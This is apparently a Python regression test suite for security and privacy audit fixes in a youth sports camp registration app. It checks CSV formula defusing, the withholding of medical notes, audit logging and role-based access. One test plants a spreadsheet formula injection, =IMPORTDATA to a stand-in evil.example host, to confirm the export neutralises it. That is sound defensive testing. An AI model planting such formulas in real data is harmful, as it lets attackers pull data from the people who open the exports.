"""Regression tests for the security & privacy audit fixes.

Each test corresponds to a verified audit finding, and asserts the fix in the
direction that matters: the exposure is closed, and the legitimate path still
works. Written so that deleting the guard makes the test fail.
"""
import base64
import json
import os
import re
import subprocess
import sys
import urllib.error
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _harness import preflight, staff_email

BASE = "http://127.0.0.1:8787"
preflight(BASE)

ADMIN = "/__admin"
ORIGIN = "https://tnsaints.com"
WORKER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ME = staff_email()
ADMIN_TOKEN = "local-dev-admin-token"

passed, failed = [], []

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass


def check(label, cond, detail=""):
    (passed if cond else failed).append(label)
    if cond or not detail:
        print(f"  {'PASS' if cond else 'FAIL'}  {label}")
    else:
        print(f"  FAIL  {label}   {str(detail).encode('ascii', 'replace').decode('ascii')}")


def _wrangler(command):
    res = subprocess.run(
        ["npx", "wrangler", "d1", "execute", "tnsaints", "--local", "--command", command],
        capture_output=True, shell=(os.name == "nt"), cwd=WORKER_DIR,
    )
    return (res.stdout or b"").decode("utf-8", errors="replace")


sql = _wrangler


def call(method, path, body=None, token=None, origin=ORIGIN):
    req = urllib.request.Request(
        BASE + path,
        data=json.dumps(body).encode() if body is not None else None,
        method=method,
    )
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if origin:
        req.add_header("Origin", origin)
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req) as r:
            raw = r.read().decode()
            try:
                return r.status, json.loads(raw)
            except json.JSONDecodeError:
                return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            return e.code, json.loads(raw)
        except json.JSONDecodeError:
            return e.code, raw


def register(name, email, ip, notes="A normal note for the security tests."):
    return call("POST", "/api/register", {
        "session_time": "9:00 AM", "player_name": name, "grade": "5th",
        "years_experience": 3, "parent_name": f"Parent of {name}",
        "parent_email": email, "phone": "(615) 555-0100",
        "school": "Franklin Elementary", "emergency_contact_name": "EC",
        "emergency_contact_phone": "(615) 555-0199",
        "medical_notes": "Peanut allergy.", "player_notes": notes,
        "assumption_of_risk": True, "medical_release": True, "photo_release": True,
        "signature": "Parent Test", "turnstile_token": "d",
    })


def reg_id(name):
    out = _wrangler(f"SELECT id FROM registrations WHERE player_name='{name}' ORDER BY id DESC LIMIT 1")
    m = re.search(r'"id":\s*(\d+)', out)
    return int(m.group(1)) if m else None


def wipe():
    for stmt in ["DELETE FROM parent_messages", "DELETE FROM decisions",
                 "DELETE FROM decision_batches", "DELETE FROM eval_notes_internal",
                 "DELETE FROM eval_feedback", "DELETE FROM registrations",
                 "DELETE FROM players", "DELETE FROM audit_log", "DELETE FROM email_budget"]:
        sql(stmt)


sql("DELETE FROM staff")
sql("INSERT INTO staff (email_norm, display_name, author_label, role, active, created_at, updated_at) "
    f"VALUES ('{ME}', 'Jacob Adams', 'Coach Adams', 'admin', 1, datetime('now'), datetime('now'))")

print("\n=== H1: a formula in a registration field cannot execute in the exported CSV ===")
wipe()
# An anonymous registrant plants a spreadsheet formula in a text field.
register("Formula Kid", "formula@example.com", "10.91.0.1",
         notes='=IMPORTDATA("https://evil.example/x") harmless-looking trailing words')
st, csv = call("GET", "/api/admin/registrations?format=csv", token=ADMIN_TOKEN)
check("csv export works", st == 200 and isinstance(csv, str), str(csv)[:120])
# The dangerous cell must not begin with a formula trigger.
check("the formula cell is defused with a leading apostrophe",
      "'=IMPORTDATA" in csv, csv[:300])
check("no cell in the file begins a formula",
      not re.search(r'(^|,)=', csv) and not re.search(r'(^|,)"=', csv), "a bare =cell survives")

print("\n=== M1: the ADMIN_TOKEN export withholds medical-note text and is audited ===")
sql("DELETE FROM audit_log")
st, r = call("GET", "/api/admin/registrations", token=ADMIN_TOKEN)
check("default export omits medical_notes text", st == 200 and "Peanut allergy" not in json.dumps(r),
      json.dumps(r)[:200])
check("but carries a has_medical_notes flag instead",
      any("has_medical_notes" in x for x in r.get("registrations", [])), json.dumps(r)[:200])
log = _wrangler("SELECT actor, action, detail FROM audit_log ORDER BY id DESC LIMIT 3")
check("the export is audited", "roster.export" in log and "token:automation" in log, log[-300:])
check("the audit holds no exported data", "Peanut allergy" not in log)

st, r = call("GET", "/api/admin/registrations?include=medical_notes", token=ADMIN_TOKEN)
check("medical text is available only on explicit opt-in",
      "Peanut allergy" in json.dumps(r), json.dumps(r)[:160])
log = _wrangler("SELECT detail FROM audit_log ORDER BY id DESC LIMIT 1")
norm_log = log.replace(" ", "").replace(chr(92), "").replace(chr(34), "")
check("and the opt-in is recorded in the audit",
      "included_medical:true" in norm_log, log[-200:])

print("\n=== M2: the daily roster digest CSV carries no medical text or signature ===")
# The digest builds its CSV from a projection that excludes those columns.
src = open(os.path.join(WORKER_DIR, "src", "email.js"), encoding="utf-8").read()
digest_sql = re.search(r"SELECT session_time.*?FROM registrations", src, re.S).group(0)
select_list = re.sub(r"CASE WHEN.*?END AS has_medical_notes,", "", digest_sql, flags=re.S)
check("digest ships a has_medical_notes flag, not the note text",
      "has_medical_notes" in digest_sql and "medical_notes" not in select_list, select_list)
check("digest query does not select the signature", "signature" not in select_list)

print("\n=== L1: a viewer cannot read coaches' internal notes via the eval form ===")
wipe()
register("Viewed Kid", "viewed@example.com", "10.92.0.1")
V = reg_id("Viewed Kid")
call("POST", f"{ADMIN}/api/eval/{V}", {
    "strengths": "Good motor.", "growth_area": "Left hand.",
    "internal_note": "VIEWER-MUST-NOT-SEE candid staff assessment."})

sql(f"UPDATE staff SET role='viewer' WHERE email_norm='{ME}'")
st, body = call("GET", f"{ADMIN}/eval/{V}")
check("viewer is refused the evaluation form", st == 403, f"got {st}")
check("and the internal note never reached them", "VIEWER-MUST-NOT-SEE" not in str(body))
st, _ = call("GET", ADMIN + "/eval")
check("viewer is refused the evaluation list too", st == 403, f"got {st}")

sql(f"UPDATE staff SET role='coach' WHERE email_norm='{ME}'")
st, body = call("GET", f"{ADMIN}/eval/{V}")
check("a coach can still open the form", st == 200, f"got {st}")
sql(f"UPDATE staff SET role='admin' WHERE email_norm='{ME}'")

print("\n=== L2: batch preflight is admin-only ===")
wipe()
register("Pre Kid", "pre@example.com", "10.93.0.1")
P = reg_id("Pre Kid")
call("POST", f"{ADMIN}/api/eval/{P}", {"strengths": "x competed hard.", "growth_area": "x left hand."})
call("POST", f"{ADMIN}/api/decision/{P}", {"decision": "accept"})
st, r = call("POST", f"{ADMIN}/api/batch/build")
PB = r.get("batchId")

sql(f"UPDATE staff SET role='coach' WHERE email_norm='{ME}'")
st, r = call("GET", f"{ADMIN}/api/batch/{PB}/preflight")
check("a coach cannot see preflight", st == 403, f"got {st}")
sql(f"UPDATE staff SET role='admin' WHERE email_norm='{ME}'")
st, r = call("GET", f"{ADMIN}/api/batch/{PB}/preflight")
check("an admin can", st == 200 and r.get("ok"), str(r)[:160])

print("\n=== L3: a short internal note is still caught by copy-detection ===")
wipe()
register("Short Note Kid", "short@example.com", "10.94.0.1")
S = reg_id("Short Note Kid")
SHORT = "mom is a real problem at games"  # ~30 chars, under the shingle window
call("POST", f"{ADMIN}/api/eval/{S}", {
    "strengths": "Short competed hard on every possession.",
    "growth_area": "Short should use the left more.",
    "internal_note": SHORT})
call("POST", f"{ADMIN}/api/decision/{S}", {"decision": "accept"})
call("POST", f"{ADMIN}/api/batch/build")
ms = int(re.search(r'"id":\s*(\d+)', _wrangler(
    f"SELECT id FROM parent_messages WHERE registration_id={S}")).group(1))
st, r = call("POST", f"{ADMIN}/api/message/{ms}/edit", {
    "body_text": f"Dear family, Short did well on Saturday. Honestly, {SHORT}, but he tries hard. "
                 "We would love to have him. Please reply with any questions."})
check("a short staff-only note pasted into a message is refused", st == 400, f"got {st} {str(r)[:160]}")
check("and it is flagged as staff-only", "staff-only" in str(r).lower(), str(r)[:200])

print("\n=== L9: the admin surface sets HSTS ===")
req = urllib.request.Request(BASE + ADMIN + "/", method="GET")
try:
    with urllib.request.urlopen(req) as rsp:
        hsts = rsp.headers.get("Strict-Transport-Security", "")
except urllib.error.HTTPError as e:
    hsts = e.headers.get("Strict-Transport-Security", "")
check("Strict-Transport-Security is present", "max-age=" in hsts, repr(hsts))

print("\n" + "=" * 62)
print(f"PASSED: {len(passed)}    FAILED: {len(failed)}")
if failed:
    print("\nFailures:")
    for f in failed:
        print("  - " + f)
print("=" * 62)
